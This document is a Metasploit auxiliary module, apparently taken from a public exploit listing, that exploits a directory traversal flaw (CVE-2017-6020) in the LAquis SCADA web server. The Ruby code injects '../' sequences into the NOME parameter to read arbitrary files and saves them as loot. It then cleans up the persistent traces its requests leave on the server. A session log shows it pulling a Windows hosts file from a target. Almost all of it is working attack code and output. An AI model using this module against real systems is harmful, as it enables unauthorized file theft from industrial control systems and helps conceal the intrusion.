 
class MetasploitModule < Msf::Auxiliary
    Rank = GreatRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;LAquis SCADA Web Server Directory Traversal Information Disclosure&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a directory traversal vulnerability found in the LAquis SCADA
                application. The vulnerability is triggered when sending a series of dot dot slashes
                (../) to the vulnerable NOME parameter found on the listagem.laquis file.
 
                This module was tested against v4.1.0.2385
            },
            &#039;Author&#039;         => [ &#039;james fitts&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2017-6020&#039; ],
                    [ &#039;ZDI&#039;, &#039;17-286&#039; ],
                    [ &#039;BID&#039;, &#039;97055&#039; ],
                    [ &#039;URL&#039;, &#039;https://ics-cert.us-cert.gov/advisories/ICSA-17-082-01&#039; ]
                ],
            &#039;DisclosureDate&#039; => &#039;Mar 29 2017&#039;))
 
        register_options(
            [
                OptInt.new(&#039;DEPTH&#039;, [ false, &#039;Levels to reach base directory&#039;, 10]),
                OptString.new(&#039;FILE&#039;, [ false, &#039;This is the file to download&#039;, &#039;boot.ini&#039;]),
                Opt::RPORT(1234)
            ], self.class )
    end
 
    def run
 
    depth = (datastore[&#039;DEPTH&#039;].nil? or datastore[&#039;DEPTH&#039;] == 0) ? 10 : datastore[&#039;DEPTH&#039;]
    levels = "/" + ("../" * depth)
 
    res = send_request_raw({
        &#039;method&#039;    =>   &#039;GET&#039;,
        &#039;uri&#039;           =>   &#039;/&#039;
    })
 
    # make sure the webserver is actually listening
    if res.code == 200
        blob = res.body.to_s.scan(/(?<=href=)[A-Za-z0-9.?=&+]+/)
         
        for url in blob
            if url =~ /listagem/
                listagem = url
            end
        end
         
        # make sure the vulnerable page is there
        # not all of the examples include the
        # vulnerable page, so we test to ensure
        # that it is there prior to executing our code
        # there is a potential that real world may not
        # include the vulnerable page in some cases
        # as well
        res = send_request_raw({
            &#039;method&#039;    =>   &#039;GET&#039;,
            &#039;uri&#039;           =>   "/#{listagem}",
        })
 
        # trigger
        if res.code == 200 and res.body.to_s =~ /<title>Listagem<\/title><\/head>/
             
            loot = []
            file_path = "#{datastore[&#039;FILE&#039;]}"
            file_path = file_path.gsub(/\//, "\\")
            cleanup = "#{listagem}"
            cleanup = cleanup.gsub(/DATA=/, "DATA=#{Rex::Text.rand_text_alphanumeric(15)}")
            cleanup = cleanup.gsub(/botao=Enviar\+consulta/, "botao=Submit\+Query")
            vulnerability = listagem.gsub(/(?<=NOME=)[A-Za-z0-9.]+/, "#{levels}#{file_path}")
 
            res = send_request_raw({
                &#039;method&#039;    =>   &#039;GET&#039;,
                &#039;uri&#039;           =>   "/#{vulnerability}"
            })
 
            if res and res.code == 200
                blob = res.body.to_s
                blob.each_line do |line|
                    loot << line.match(/.*&nbps;<\/font><\/td>.*$/)
                end
 
                loot = loot.join.gsub(/&nbps;<\/font><\/td>/, "\r\n")
 
                if not loot or loot.empty?
                    print_status("File from \&#039;#{rhost}:#{rport}\&#039; is empty...")
                    return
                end
                file = ::File.basename(datastore[&#039;FILE&#039;])
                path = store_loot(&#039;laquis.file&#039;, &#039;application/octet-stream&#039;, rhost, loot, file, datastore[&#039;FILE&#039;])
                print_status("Stored \&#039;#{datastore[&#039;FILE&#039;]}\&#039; to \&#039;#{path}\&#039;")
 
                # cleaning up afterwards because the response
                # data from before is written and becomes
                # persistent
                referer = cleanup.gsub(/DATA=[A-Za-z0-9]+/, "DATA=")
 
                res = send_request_raw({
                    &#039;method&#039;    =>   &#039;GET&#039;,
                    &#039;uri&#039;           =>   "/#{listagem}"
                })
 
                if res.code == 200
                    nome = res.body.to_s.match(/(?<=<input type=hidden name=NOME value=")[A-Za-z0-9.]+/)
                    cleanup = cleanup.gsub(/(?<=NOME=)[A-Za-z0-9.]+/, "#{nome}")
                    res = send_request_raw({
                        &#039;method&#039;    =>   &#039;GET&#039;,
                        &#039;uri&#039;           =>   "/#{cleanup}",
                        &#039;headers&#039;   =>   {
                            &#039;Referer&#039;   =>   "http://#{rhost}:#{rport}/#{referer}",
                            &#039;Accept-Language&#039;   =>   &#039;en-US,en;q=0.5&#039;,
                            &#039;Accept-Encoding&#039;   =>   &#039;gzip, deflate&#039;,
                            &#039;Connection&#039;    =>   &#039;close&#039;,
                            &#039;Upgrade-Insecure-Requests&#039; =>   &#039;1&#039;,
                            &#039;Cache-Control&#039; =>   &#039;max-age=0&#039;
                        }
                    })
                end
 
                return
 
            end
 
        else
            print_error("Vulnerable page does not exist...")
        end
 
    else
        print_error("The server does not appear to be listening...")
    end
 
    end
end
__END__
msf auxiliary(laquis_directory_traversal) > show options
 
Module options (auxiliary/server/laquis_directory_traversal):
 
   Name     Current Setting                     Required  Description
   ----     ---------------                     --------  -----------
   DEPTH    10                                  no        Levels to reach base directory
   FILE     Windows/System32/drivers/etc/hosts  no        This is the file to download
   Proxies                                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST    192.168.1.2                         yes       The target address
   RPORT    1234                                yes       The target port (TCP)
   SSL      false                               no        Negotiate SSL/TLS for outgoing connections
   VHOST                                        no        HTTP server virtual host
 
msf auxiliary(laquis_directory_traversal) > rexploit
[*] Reloading module...
 
[*] Stored &#039;Windows/System32/drivers/etc/hosts&#039; to &#039;/home/james/.msf4/loot/20170927110756_default_192.168.1.2_laquis.file_227964.bin&#039;
[*] Auxiliary module execution completed
 
james@bloop:~/.msf4/loot$ cat 20170927110456_default_192.168.1.2_laquis.file_677204.bin
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a &#039;#&#039; symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host
 
# localhost name resolution is handled within DNS itself.
#
#

